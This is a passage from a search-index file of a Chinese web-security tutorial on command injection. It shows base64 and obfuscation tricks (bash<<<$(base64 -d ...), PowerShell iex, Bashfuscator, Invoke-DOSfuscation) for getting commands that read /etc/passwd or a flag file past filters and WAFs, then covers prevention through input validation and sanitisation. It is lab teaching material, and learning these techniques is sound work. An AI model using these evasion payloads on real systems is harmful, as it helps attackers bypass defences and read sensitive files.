<code>xxd</code>\uff08\u7528\u4e8e\u5341\u516d\u8fdb\u5236\u7f16\u7801\uff09\u3002<code>\u6211\u4eec\u4ee5base64</code> \u4e3a\u4f8b\u3002\u9996\u5148\uff0c\u6211\u4eec\u5c06\u5bf9\u8981\u6267\u884c\u7684\u6709\u6548\u8d1f\u8f7d\u8fdb\u884c\u7f16\u7801\uff08\u5305\u62ec\u8fc7\u6ee4\u5b57\u7b26\uff09\uff1a</p> <pre><code>$ echo -n 'cat /etc/passwd | grep 33' | base64\n\nY2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==\n</code></pre> <p>\u73b0\u5728\u6211\u4eec\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u547d\u4ee4\uff0c\u5b83\u5c06\u5728\u5b50 shell (<code>$()</code>) \u4e2d\u89e3\u7801\u7f16\u7801\u7684\u5b57\u7b26\u4e32\uff0c\u7136\u540e\u5c06\u5176\u4f20\u9012\u7ed9 <code>bash</code> \u4ee5\u6267\u884c\uff08\u5373 <code>bash&lt;&lt;&lt;</code>\uff09\uff0c\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>$ bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)\n\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n</code></pre> <p>\u6b63\u5982\u6211\u4eec\u6240\u770b\u5230\u7684\uff0c\u4e0a\u9762\u7684\u547d\u4ee4\u5b8c\u7f8e\u5730\u6267\u884c\u4e86\u547d\u4ee4\u3002\u6211\u4eec\u6ca1\u6709\u5305\u542b\u4efb\u4f55\u8fc7\u6ee4\u5b57\u7b26\uff0c\u5e76\u907f\u514d\u4e86\u53ef\u80fd\u5bfc\u81f4\u547d\u4ee4\u65e0\u6cd5\u6267\u884c\u7684\u7f16\u7801\u5b57\u7b26\u3002</p> <p>\u63d0\u793a\uff1a\u8bf7\u6ce8\u610f\uff0c\u6211\u4eec\u4f7f\u7528 <code>&lt;&lt;&lt;</code> \u6765\u907f\u514d\u4f7f\u7528\u7ad6\u7ebf <code>|</code>\uff0c\u8fd9\u662f\u4e00\u4e2a\u8fc7\u6ee4\u5b57\u7b26\u3002</p> <p>\u73b0\u5728\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u547d\u4ee4\uff08\u4e00\u65e6\u6211\u4eec\u66ff\u6362\u4e86\u7a7a\u683c\uff09\u901a\u8fc7\u547d\u4ee4\u6ce8\u5165\u6267\u884c\u76f8\u540c\u7684\u547d\u4ee4\uff1a</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#burp-post-request_4","title":"Burp POST Request","text":"<p>![[Pasted image 20221212133719.png]]</p> <p>\u5373\u4f7f\u67d0\u4e9b\u547d\u4ee4\u88ab\u8fc7\u6ee4\uff0c\u5982 <code>bash</code> \u6216 <code>base64</code>\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u4f7f\u7528\u6211\u4eec\u5728\u4e0a\u4e00\u8282\u4e2d\u8ba8\u8bba\u7684\u6280\u672f\uff08\u4f8b\u5982\uff0c\u5b57\u7b26\u63d2\u5165\uff09\u7ed5\u8fc7\u8be5\u8fc7\u6ee4\u5668\uff0c\u6216\u4f7f\u7528\u5176\u4ed6\u66ff\u4ee3\u65b9\u6cd5\uff0c\u5982 <code>sh</code> \u7528\u4e8e\u547d\u4ee4\u6267\u884c\u548c <code>openssl</code> \u7528\u4e8e b64 \u89e3\u7801\uff0c\u6216 <code>xxd</code> \u7528\u4e8e\u5341\u516d\u8fdb\u5236\u89e3\u7801\u3002</p> <p>\u6211\u4eec\u4e5f\u5bf9 Windows \u4f7f\u7528\u76f8\u540c\u7684\u6280\u672f\u3002\u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u5bf9\u6211\u4eec\u7684\u5b57\u7b26\u4e32\u8fdb\u884c base64 \u7f16\u7801\uff0c\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>PS C:\\htb&gt; [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))\n\ndwBoAG8AYQBtAGkA\n</code></pre> <p>\u6211\u4eec\u4e5f\u53ef\u4ee5\u5728 Linux \u4e0a\u5b9e\u73b0\u540c\u6837\u7684\u4e8b\u60c5\uff0c\u4f46\u662f\u6211\u4eec\u5fc5\u987b\u5148\u5c06\u5b57\u7b26\u4e32\u4ece <code>utf-8</code> \u8f6c\u6362\u4e3a <code>utf-16</code>\uff0c\u7136\u540e\u518d\u5bf9\u5176\u8fdb\u884c <code>base64</code>\uff0c\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64\n\ndwBoAG8AYQBtAGkA\n</code></pre> <p>\u6700\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u89e3\u7801 b64 \u5b57\u7b26\u4e32\u5e76\u4f7f\u7528 PowerShell \u5b50 shell\uff08<code>iex \"\"$()\"</code>\uff09\u6267\u884c\u5b83\uff0c\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>PS C:\\htb&gt; iex \"$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))\"\n\n21y4d\n</code></pre> <p>\u6b63\u5982\u6211\u4eec\u6240\u770b\u5230\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 <code>Bash</code> \u6216 <code>PowerShell</code> \u53d1\u6325\u521b\u610f\uff0c\u5e76\u521b\u5efa\u4ee5\u524d\u672a\u4f7f\u7528\u8fc7\u7684\u65b0\u7684\u7ed5\u8fc7\u548c\u6df7\u6dc6\u65b9\u6cd5\uff0c\u56e0\u6b64\u5f88\u53ef\u80fd\u7ed5\u8fc7\u8fc7\u6ee4\u5668\u548c WAF\u3002\u6709\u51e0\u79cd\u5de5\u5177\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u81ea\u52a8\u6df7\u6dc6\u6211\u4eec\u7684\u547d\u4ee4\uff0c\u6211\u4eec\u5c06\u5728\u4e0b\u4e00\u8282\u4e2d\u8ba8\u8bba\u3002</p> <p>\u9664\u4e86\u6211\u4eec\u8ba8\u8bba\u7684\u6280\u672f\u4e4b\u5916\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u4f7f\u7528\u8bb8\u591a\u5176\u4ed6\u65b9\u6cd5\uff0c\u4f8b\u5982\u901a\u914d\u7b26\u3001\u6b63\u5219\u8868\u8fbe\u5f0f\u3001\u8f93\u51fa\u91cd\u5b9a\u5411\u3001\u6574\u6570\u6269\u5c55\u7b49\u7b49\u3002\u6211\u4eec\u53ef\u4ee5\u5728 PayloadsAllTheThings \u4e0a\u627e\u5230\u4e00\u4e9b\u8fd9\u6837\u7684\u6280\u672f\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#evasion-tools","title":"Evasion(\u89c4\u907f) Tools","text":"<p>\u5982\u679c\u6211\u4eec\u6b63\u5728\u5904\u7406\u9ad8\u7ea7\u5b89\u5168\u5de5\u5177\uff0c\u6211\u4eec\u53ef\u80fd\u65e0\u6cd5\u4f7f\u7528\u57fa\u672c\u7684\u624b\u52a8\u6df7\u6dc6\u6280\u672f\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u6700\u597d\u6c42\u52a9\u4e8e\u81ea\u52a8\u6df7\u6dc6\u5de5\u5177\u3002\u672c\u8282\u5c06\u8ba8\u8bba\u8fd9\u4e9b\u7c7b\u578b\u5de5\u5177\u7684\u51e0\u4e2a\u793a\u4f8b\uff0c\u4e00\u4e2a\u7528\u4e8e <code>Linux</code>\uff0c\u53e6\u4e00\u4e2a\u7528\u4e8e <code>Windows</code>\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#linux-bashfuscator","title":"Linux (Bashfuscator)","text":"<p>\u6211\u4eec\u53ef\u4ee5\u7528\u6765\u6df7\u6dc6 bash \u547d\u4ee4\u7684\u4e00\u4e2a\u65b9\u4fbf\u7684\u5de5\u5177\u662f Bashfuscator\u3002\u6211\u4eec\u53ef\u4ee5\u4ece GitHub \u514b\u9686\u5b58\u50a8\u5e93\uff0c\u7136\u540e\u5b89\u88c5\u5176\u8981\u6c42\uff0c\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>$ git clone https://github.com/Bashfuscator/Bashfuscator\n$ cd Bashfuscator\n$ python3 setup.py install --user\n</code></pre> <p>\u4e00\u65e6\u6211\u4eec\u8bbe\u7f6e\u4e86\u5de5\u5177\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u4ece <code>./bashfuscator/bin/</code> \u76ee\u5f55\u5f00\u59cb\u4f7f\u7528\u5b83\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u8be5\u5de5\u5177\u4f7f\u7528\u8bb8\u591a\u6807\u5fd7\u6765\u5fae\u8c03\u6211\u4eec\u6700\u7ec8\u7684\u6df7\u6dc6\u547d\u4ee4\uff0c\u6b63\u5982\u6211\u4eec\u5728 <code>-h</code> \u5e2e\u52a9\u83dc\u5355\u4e2d\u770b\u5230\u7684\u90a3\u6837\uff1a</p> <pre><code>$ cd ./bashfuscator/bin/\n$ ./bashfuscator -h\n\nusage: bashfuscator [-h] [-l] ...SNIP...\n\noptional arguments:\n  -h, --help            show this help message and exit\n\nProgram Options:\n  -l, --list            List all the available obfuscators, compressors, and encoders\n  -c COMMAND, --command COMMAND\n                        Command to obfuscate\n...SNIP...\n</code></pre> <p>\u6211\u4eec\u53ef\u4ee5\u4ece\u7b80\u5355\u5730\u63d0\u4f9b\u6211\u4eec\u60f3\u8981\u4f7f\u7528 <code>-c</code> \u6807\u5fd7\u8fdb\u884c\u6df7\u6dc6\u7684\u547d\u4ee4\u5f00\u59cb\uff1a</p> <pre><code>$ ./bashfuscator -c 'cat /etc/passwd'\n\n[+] Mutators used: Token/ForCode -&gt; Command/Reverse\n[+] Payload:\n ${*/+27\\[X\\(} ...SNIP...  ${*~}   \n[+] Payload size: 1664 characters\n</code></pre> <p>\u4f46\u662f\uff0c\u8fd9\u6837\u8fd0\u884c\u8be5\u5de5\u5177\u4f1a\u968f\u673a\u9009\u62e9\u4e00\u79cd\u6df7\u6dc6\u6280\u672f\uff0c\u8f93\u51fa\u7684\u547d\u4ee4\u957f\u5ea6\u4ece\u51e0\u767e\u4e2a\u5b57\u7b26\u5230\u4e0a\u767e\u4e07\u4e2a\u5b57\u7b26\u4e0d\u7b49\uff01\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5e2e\u52a9\u83dc\u5355\u4e2d\u7684\u4e00\u4e9b\u6807\u5fd7\u6765\u751f\u6210\u66f4\u77ed\u3001\u66f4\u7b80\u5355\u7684\u6df7\u6dc6\u547d\u4ee4\uff0c\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>$ ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1\n\n[+] Mutators used: Token/ForCode\n[+] Payload:\neval \"$(W0=(w \\  t e c p s a \\/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s \"${W0[$Ll]}\";};)\"\n[+] Payload size: 104 characters\n</code></pre> <p>\u6211\u4eec\u73b0\u5728\u53ef\u4ee5\u4f7f\u7528 <code>bash -c ' '</code> \u6d4b\u8bd5\u8f93\u51fa\u7684\u547d\u4ee4\uff0c\u770b\u770b\u5b83\u662f\u5426\u6267\u884c\u4e86\u9884\u671f\u7684\u547d\u4ee4\uff1a</p> <pre><code>$ bash -c 'eval \"$(W0=(w \\  t e c p s a \\/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s \"${W0[$Ll]}\";};)\"'\n\nroot:x:0:0:root:/root:/bin/bash\n...SNIP...\n</code></pre> <p>\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6df7\u6dc6\u540e\u7684\u547d\u4ee4\u6709\u6548\uff0c\u4f46\u770b\u8d77\u6765\u5b8c\u5168\u6df7\u6dc6\u4e86\uff0c\u5e76\u4e14\u4e0e\u6211\u4eec\u7684\u539f\u59cb\u547d\u4ee4\u4e0d\u540c\u3002\u6211\u4eec\u53ef\u80fd\u8fd8\u4f1a\u6ce8\u610f\u5230\u8be5\u5de5\u5177\u4f7f\u7528\u4e86\u8bb8\u591a\u6df7\u6dc6\u6280\u672f\uff0c\u5305\u62ec\u6211\u4eec\u4e4b\u524d\u8ba8\u8bba\u7684\u6280\u672f\u548c\u8bb8\u591a\u5176\u4ed6\u6280\u672f\u3002</p> <p>\u7ec3\u4e60\uff1a\u5c1d\u8bd5\u4f7f\u7528\u6211\u4eec\u7684 Web \u5e94\u7528\u7a0b\u5e8f\u6d4b\u8bd5\u4e0a\u8ff0\u547d\u4ee4\uff0c\u770b\u770b\u5b83\u662f\u5426\u53ef\u4ee5\u6210\u529f\u7ed5\u8fc7\u8fc7\u6ee4\u5668\u3002\u5982\u679c\u6ca1\u6709\uff0c\u4f60\u80fd\u731c\u51fa\u4e3a\u4ec0\u4e48\u5417\uff1f\u4f60\u80fd\u8ba9\u8fd9\u4e2a\u5de5\u5177\u4ea7\u751f\u6709\u6548\u8f7d\u8377\u5417\uff1f</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#windows-dosfuscation","title":"Windows (DOSfuscation)","text":"<p>\u8fd8\u6709\u4e00\u4e2a\u975e\u5e38\u76f8\u4f3c\u7684\u5de5\u5177\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u5176\u7528\u4e8e Windows\uff0c\u79f0\u4e3a DOSfuscation\u3002\u4e0e <code>Bashfuscator</code> \u4e0d\u540c\uff0c\u8fd9\u662f\u4e00\u4e2a\u4ea4\u4e92\u5f0f\u5de5\u5177\uff0c\u56e0\u4e3a\u6211\u4eec\u8fd0\u884c\u5b83\u4e00\u6b21\u5e76\u4e0e\u4e4b\u4ea4\u4e92\u4ee5\u83b7\u5f97\u6240\u9700\u7684\u6df7\u6dc6\u547d\u4ee4\u3002\u6211\u4eec\u53ef\u4ee5\u518d\u6b21\u4ece GitHub \u514b\u9686\u8be5\u5de5\u5177\uff0c\u7136\u540e\u901a\u8fc7 PowerShell \u8c03\u7528\u5b83\uff0c\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>PS C:\\htb&gt; git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git\nPS C:\\htb&gt; cd Invoke-DOSfuscation\nPS C:\\htb&gt; Import-Module .\\Invoke-DOSfuscation.psd1\nPS C:\\htb&gt; Invoke-DOSfuscation\nInvoke-DOSfuscation&gt; help\n\nHELP MENU :: Available options shown below:\n[*]  Tutorial of how to use this tool             TUTORIAL\n...SNIP...\n\nChoose one of the below options:\n[*] BINARY      Obfuscated binary syntax for cmd.exe &amp; powershell.exe\n[*] ENCODING    Environment variable encoding\n[*] PAYLOAD     Obfuscated payload via DOSfuscation\n</code></pre> <p>\u6211\u4eec\u751a\u81f3\u53ef\u4ee5\u4f7f\u7528\u6559\u7a0b(<code>tutorial</code>)\u6765\u67e5\u770b\u8be5\u5de5\u5177\u5982\u4f55\u5de5\u4f5c\u7684\u793a\u4f8b\u3002\u8bbe\u7f6e\u597d\u540e\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5f00\u59cb\u4f7f\u7528\u8be5\u5de5\u5177\u4e86\uff0c\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>Invoke-DOSfuscation&gt; SET COMMAND type C:\\Users\\htb-student\\Desktop\\flag.txt\nInvoke-DOSfuscation&gt; encoding\nInvoke-DOSfuscation\\Encoding&gt; 1\n\n...SNIP...\nResult:\ntyp%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\\Users\\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\\flag.%TMP:~-13,-12%xt\n</code></pre> <p>\u6700\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u5728 <code>CMD</code> \u4e0a\u8fd0\u884c\u6df7\u6dc6\u540e\u7684\u547d\u4ee4\uff0c\u6211\u4eec\u770b\u5230\u5b83\u786e\u5b9e\u6309\u9884\u671f\u8fd0\u884c\uff1a</p> <pre><code>C:\\htb&gt; typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\\Users\\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\\flag.%TMP:~-13,-12%xt\n\ntest_flag\n</code></pre> <p>\u63d0\u793a\uff1a\u5982\u679c\u6211\u4eec\u65e0\u6cd5\u8bbf\u95ee Windows VM\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 pwsh \u5728 Linux VM \u4e0a\u8fd0\u884c\u4e0a\u8ff0\u4ee3\u7801\u3002\u8fd0\u884c pwsh\uff0c\u7136\u540e\u6267\u884c\u4e0e\u4e0a\u9762\u5b8c\u5168\u76f8\u540c\u7684\u547d\u4ee4\u3002\u6b64\u5de5\u5177\u9ed8\u8ba4\u5b89\u88c5\u5728\u60a8\u7684 <code>Pwnbox</code> \u5b9e\u4f8b\u4e2d\u3002\u60a8\u8fd8\u53ef\u4ee5\u5728\u6b64\u94fe\u63a5\u4e2d\u627e\u5230\u5b89\u88c5\u8bf4\u660e\u3002</p> <p>\u6709\u5173\u9ad8\u7ea7\u6df7\u6dc6\u65b9\u6cd5\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u60a8\u53ef\u4ee5\u53c2\u8003\u5b89\u5168\u7f16\u7801 101\uff1aJavaScript \u6a21\u5757\uff0c\u5176\u4e2d\u4ecb\u7ecd\u4e86\u53ef\u7528\u4e8e\u5404\u79cd\u653b\u51fb\u7684\u9ad8\u7ea7\u6df7\u6dc6\u65b9\u6cd5\uff0c\u5305\u62ec\u6211\u4eec\u5728\u672c\u6a21\u5757\u4e2d\u4ecb\u7ecd\u7684\u65b9\u6cd5\u3002 </p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#_23","title":"\u9884\u9632","text":""},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#_24","title":"\u547d\u4ee4\u6ce8\u5165 \u9884\u9632","text":"<p>\u6211\u4eec\u73b0\u5728\u5e94\u8be5\u5bf9\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e\u5982\u4f55\u53d1\u751f\u4ee5\u53ca\u5982\u4f55\u7ed5\u8fc7\u67d0\u4e9b\u7f13\u89e3\u63aa\u65bd\uff08\u5982\u5b57\u7b26\u548c\u547d\u4ee4\u8fc7\u6ee4\u5668\uff09\u6709\u6df1\u5165\u7684\u4e86\u89e3\u3002\u672c\u8282\u5c06\u8ba8\u8bba\u6211\u4eec\u53ef\u4ee5\u7528\u6765\u9632\u6b62 Web \u5e94\u7528\u7a0b\u5e8f\u4e2d\u7684\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e\u7684\u65b9\u6cd5\uff0c\u5e76\u6b63\u786e\u914d\u7f6e Web \u670d\u52a1\u5668\u4ee5\u9632\u6b62\u5b83\u4eec\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#_25","title":"\u7cfb\u7edf\u547d\u4ee4","text":"<p>\u6211\u4eec\u5e94\u8be5\u59cb\u7ec8\u907f\u514d\u4f7f\u7528\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u7684\u51fd\u6570\uff0c\u5c24\u5176\u662f\u5f53\u6211\u4eec\u4f7f\u7528\u7528\u6237\u8f93\u5165\u65f6\u3002\u5373\u4f7f\u6211\u4eec\u6ca1\u6709\u76f4\u63a5\u5c06\u7528\u6237\u8f93\u5165\u8f93\u5165\u5230\u8fd9\u4e9b\u51fd\u6570\u4e2d\uff0c\u7528\u6237\u4e5f\u53ef\u80fd\u4f1a\u95f4\u63a5\u5f71\u54cd\u5b83\u4eec\uff0c\u8fd9\u6700\u7ec8\u53ef\u80fd\u4f1a\u5bfc\u81f4\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e\u3002</p> <p>\u6211\u4eec\u4e0d\u5e94\u4f7f\u7528\u7cfb\u7edf\u547d\u4ee4\u6267\u884c\u51fd\u6570\uff0c\u800c\u5e94\u4f7f\u7528\u6267\u884c\u6240\u9700\u529f\u80fd\u7684\u5185\u7f6e\u51fd\u6570\uff0c\u56e0\u4e3a\u540e\u7aef\u8bed\u8a00\u901a\u5e38\u5177\u6709\u8fd9\u4e9b\u7c7b\u578b\u529f\u80fd\u7684\u5b89\u5168\u5b9e\u73b0\u3002\u4f8b\u5982\uff0c\u5047\u8bbe\u6211\u4eec\u60f3\u4f7f\u7528 <code>PHP</code> \u6d4b\u8bd5\u7279\u5b9a\u4e3b\u673a\u662f\u5426\u5904\u4e8e\u6d3b\u52a8\u72b6\u6001\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u6539\u7528 <code>fsockopen</code> \u51fd\u6570\uff0c\u5b83\u4e0d\u5e94\u8be5\u88ab\u5229\u7528\u6765\u6267\u884c\u4efb\u610f\u7cfb\u7edf\u547d\u4ee4\u3002</p> <p>\u5982\u679c\u6211\u4eec\u9700\u8981\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\uff0c\u5e76\u4e14\u627e\u4e0d\u5230\u6267\u884c\u76f8\u540c\u529f\u80fd\u7684\u5185\u7f6e\u51fd\u6570\uff0c\u6211\u4eec\u4e0d\u5e94\u8be5\u76f4\u63a5\u4f7f\u7528\u8fd9\u4e9b\u51fd\u6570\u7684\u7528\u6237\u8f93\u5165\uff0c\u800c\u5e94\u8be5\u59cb\u7ec8\u5728\u540e\u7aef\u9a8c\u8bc1\u548c\u6e05\u7406\u7528\u6237\u8f93\u5165\u3002\u6b64\u5916\uff0c\u6211\u4eec\u5e94\u8be5\u5c3d\u91cf\u9650\u5236\u5bf9\u8fd9\u4e9b\u7c7b\u578b\u51fd\u6570\u7684\u4f7f\u7528\uff0c\u5e76\u4e14\u4ec5\u5728\u6ca1\u6709\u5185\u7f6e\u66ff\u4ee3\u6211\u4eec\u6240\u9700\u529f\u80fd\u7684\u60c5\u51b5\u4e0b\u4f7f\u7528\u5b83\u4eec\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#_26","title":"\u8f93\u5165\u9a8c\u8bc1","text":"<p>\u65e0\u8bba\u662f\u4f7f\u7528\u5185\u7f6e\u51fd\u6570\u8fd8\u662f\u7cfb\u7edf\u547d\u4ee4\u6267\u884c\u51fd\u6570\uff0c\u6211\u4eec\u90fd\u5e94\u8be5\u59cb\u7ec8\u9a8c\u8bc1\u5e76\u51c0\u5316\u7528\u6237\u8f93\u5165\u3002\u5b8c\u6210\u8f93\u5165\u9a8c\u8bc1\u4ee5\u786e\u4fdd\u5b83\u4e0e\u8f93\u5165\u7684\u9884\u671f\u683c\u5f0f\u5339\u914d\uff0c\u8fd9\u6837\u5982\u679c\u4e0d\u5339\u914d\uff0c\u8bf7\u6c42\u5c06\u88ab\u62d2\u7edd\u3002\u5728\u6211\u4eec\u7684\u793a\u4f8b Web \u5e94\u7528\u7a0b\u5e8f\u4e2d\uff0c\u6211\u4eec\u770b\u5230\u5c1d\u8bd5\u5728\u524d\u7aef\u8fdb\u884c\u8f93\u5165\u9a8c\u8bc1\uff0c<code>\u4f46\u8f93\u5165\u9a8c\u8bc1\u5e94\u8be5\u540c\u65f6\u5728\u524d\u7aef\u548c\u540e\u7aef\u8fdb\u884c</code>\u3002</p> <p>\u5728 <code>PHP</code> \u4e2d\uff0c\u4e0e\u8bb8\u591a\u5176\u4ed6 Web \u5f00\u53d1\u8bed\u8a00\u4e00\u6837\uff0c\u5185\u7f6e\u4e86\u5404\u79cd\u6807\u51c6\u683c\u5f0f\u7684\u8fc7\u6ee4\u5668\uff0c\u5982\u7535\u5b50\u90ae\u4ef6\u3001URL \u751a\u81f3 IP\uff0c\u53ef\u4ee5\u4e0e <code>filter_var</code> \u51fd\u6570\u4e00\u8d77\u4f7f\u7528\uff0c\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {\n    // call function\n} else {\n    // deny request\n}\n</code></pre> <p>\u5982\u679c\u6211\u4eec\u60f3\u8981\u9a8c\u8bc1\u4e0d\u540c\u7684\u975e\u6807\u51c6\u683c\u5f0f\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5e26\u6709 <code>preg_match</code> \u51fd\u6570\u7684\u6b63\u5219\u8868\u8fbe\u5f0f <code>regex</code>\u3002\u5bf9\u4e8e\u524d\u7aef\u548c\u540e\u7aef\uff08\u5373 <code>NodeJS</code>\uff09\uff0c\u53ef\u4ee5\u4f7f\u7528 <code>JavaScript</code> \u5b9e\u73b0\u76f8\u540c\u7684\u6548\u679c\uff0c\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>if(/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(ip)){\n    // call function\n}\nelse{\n    // deny request\n}\n</code></pre> <p>\u5c31\u50cf <code>PHP</code> \u4e00\u6837\uff0c\u501f\u52a9 <code>NodeJS</code>\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u4f7f\u7528\u5e93\u6765\u9a8c\u8bc1\u5404\u79cd\u6807\u51c6\u683c\u5f0f\uff0c\u4f8b\u5982 is-ip\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 <code>npm</code> \u5b89\u88c5\u5b83\uff0c\u7136\u540e\u5728\u6211\u4eec\u7684\u4ee3\u7801\u4e2d\u4f7f\u7528 <code>isIp(ip)</code> \u51fd\u6570\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#input-sanitization","title":"Input Sanitization(\u6d88\u6bd2)","text":"<p>\u9632\u6b62\u4efb\u4f55\u6ce8\u5165\u6f0f\u6d1e\u6700\u5173\u952e\u7684\u90e8\u5206\u662f\u8f93\u5165\u6e05\u7406\uff0c\u8fd9\u610f\u5473\u7740\u4ece\u7528\u6237\u8f93\u5165\u4e2d\u5220\u9664\u4efb\u4f55\u4e0d\u5fc5\u8981\u7684\u7279\u6b8a\u5b57\u7b26\u3002\u8f93\u5165\u6e05\u7406\u603b\u662f\u5728\u8f93\u5165\u9a8c\u8bc1\u4e4b\u540e\u6267\u884c\u3002\u5373\u4f7f\u5728\u6211\u4eec\u9a8c\u8bc1\u63d0\u4f9b\u7684\u7528\u6237\u8f93\u5165\u7684\u683c\u5f0f\u6b63\u786e\u4e4b\u540e\uff0c\u6211\u4eec\u4ecd\u5e94\u6267\u884c\u6e05\u7406\u5e76\u5220\u9664\u7279\u5b9a\u683c\u5f0f\u4e0d\u9700\u8981\u7684\u4efb\u4f55\u7279\u6b8a\u5b57\u7b26\uff0c\u56e0\u4e3a\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\u8f93\u5165\u9a8c\u8bc1\u53ef\u80fd\u4f1a\u5931\u8d25\uff08\u4f8b\u5982\uff0c\u9519\u8bef\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\uff09\u3002 </p> 